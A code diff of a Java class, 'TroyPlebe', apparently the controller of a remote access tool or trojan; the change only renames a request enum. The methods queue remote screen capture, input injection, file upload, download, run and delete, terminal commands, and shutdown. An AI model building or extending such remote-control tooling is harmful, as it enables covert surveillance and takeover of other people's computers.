@@ -49,35 +49,35 @@ public class TroyPlebe {
     }
 
     public UniqueTroyRequest getNetInfo() {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunction.NET_INFO, true);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.NET_INFO, true);
         requests.add(req);
         return req;
     }
 
     public UniqueTroyRequest getDisconnect() {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunction.DISCONNECT, false);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.DISCONNECT, false);
         requests.add(req);
         return req;
     }
 
     public void doStop() {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunction.STOP, false);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.STOP, false);
         requests.add(req);
     }
 
     public void doToggleLock(boolean lock) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, lock, RequestFunction.LOCK, false);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, lock, RequestFunctionType.LOCK, false);
         requests.add(req);
     }
 
     public RecurrentTroyRequest startScreenCapture(MonitorDesktopWrapper wrapper) {
-        RecurrentTroyRequest req = new RecurrentTroyRequest(wrapper, RequestFunction.DESKTOP_START);
+        RecurrentTroyRequest req = new RecurrentTroyRequest(wrapper, RequestFunctionType.DESKTOP_START);
         requests.add(req);
         return req;
     }
 
     public void sendUserInputs(ArrayList<UserInput> inputs) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, inputs, RequestFunction.USER_INPUT, false);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, inputs, RequestFunctionType.USER_INPUT, false);
         requests.add(req);
     }
 
@@ -98,87 +98,87 @@ public class TroyPlebe {
     }
 
     public UniqueTroyRequest getDrives() {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(BrowserTicketType.LOAD_DRIVES), RequestFunction.FILES, true);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(BrowserTicketType.LOAD_DRIVES), RequestFunctionType.FILES, true);
         requests.add(req);
         return req;
     }
 
     public UniqueTroyRequest getFiles(Path dir) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(dir.toString(), BrowserTicketType.LOAD_FILES), RequestFunction.FILES, true);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(dir.toString(), BrowserTicketType.LOAD_FILES), RequestFunctionType.FILES, true);
         requests.add(req);
         return req;
     }
 
     public UniqueTroyRequest runFile(Path path) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.RUN), RequestFunction.FILES, true);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.RUN), RequestFunctionType.FILES, true);
         requests.add(req);
         return req;
     }
 
     public UniqueTroyRequest uploadFile(Path path, String fileName, byte[] bytes) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.UPLOAD, fileName, bytes), RequestFunction.FILES, true);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.UPLOAD, fileName, bytes), RequestFunctionType.FILES, true);
         requests.add(req);
         return req;
     }
 
     public UniqueTroyRequest getKnownFolders() {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(BrowserTicketType.KNOWN_FOLDERS), RequestFunction.FILES, true);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(BrowserTicketType.KNOWN_FOLDERS), RequestFunctionType.FILES, true);
         requests.add(req);
         return req;
     }
 
     public UniqueTroyRequest deleteFile(Path path) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.DELETE), RequestFunction.FILES, true);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.DELETE), RequestFunctionType.FILES, true);
         requests.add(req);
         return req;
     }
 
     public UniqueTroyRequest downloadFile(Path path) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.DOWNLOAD), RequestFunction.FILES, true);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, new FileBrowserTicket(path.toString(), BrowserTicketType.DOWNLOAD), RequestFunctionType.FILES, true);
         requests.add(req);
         return req;
     }
 
     public TroyRequest startTerminal() {
-        RecurrentTroyRequest req = new RecurrentTroyRequest(EMPTY, RequestFunction.TERMINAL_START);
+        RecurrentTroyRequest req = new RecurrentTroyRequest(EMPTY, RequestFunctionType.TERMINAL_START);
         requests.add(req);
         return req;
     }
 
     public Object startChat() {
-        RecurrentTroyRequest req = new RecurrentTroyRequest(EMPTY, RequestFunction.CHAT_START);
+        RecurrentTroyRequest req = new RecurrentTroyRequest(EMPTY, RequestFunctionType.CHAT_START);
         requests.add(req);
         return req;
     }
 
     public void sendTerminalCommand(String command) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, command, RequestFunction.TERMINAL_COMMAND, false);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, command, RequestFunctionType.TERMINAL_COMMAND, false);
         requests.add(req);
     }
 
     public void sendChatMessage(String message) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, message, RequestFunction.CHAT_MESSAGE, false);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, message, RequestFunctionType.CHAT_MESSAGE, false);
         requests.add(req);
     }
 
     public void releaseRequest(RecurrentTroyRequest request) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, request.getTicket().getId(), RequestFunction.RELEASE, false);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, request.getTicket().getId(), RequestFunctionType.RELEASE, false);
         requests.add(req);
         request.getReleased().set(true);
     }
 
     public void refreshDesktop(MonitorDesktopWrapper wrapper) {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, wrapper, RequestFunction.DESKTOP_REFRESH, false);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, wrapper, RequestFunctionType.DESKTOP_REFRESH, false);
         requests.add(req);
     }
 
     public void turnOff() {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunction.TURN_OFF, false);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.TURN_OFF, false);
         requests.add(req);
     }
 
     public UniqueTroyRequest getMonitorCount() {
-        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunction.MONITOR_COUNT, true);
+        UniqueTroyRequest req = new UniqueTroyRequest(this, EMPTY, RequestFunctionType.MONITOR_COUNT, true);
         requests.add(req);
         return req;
     }
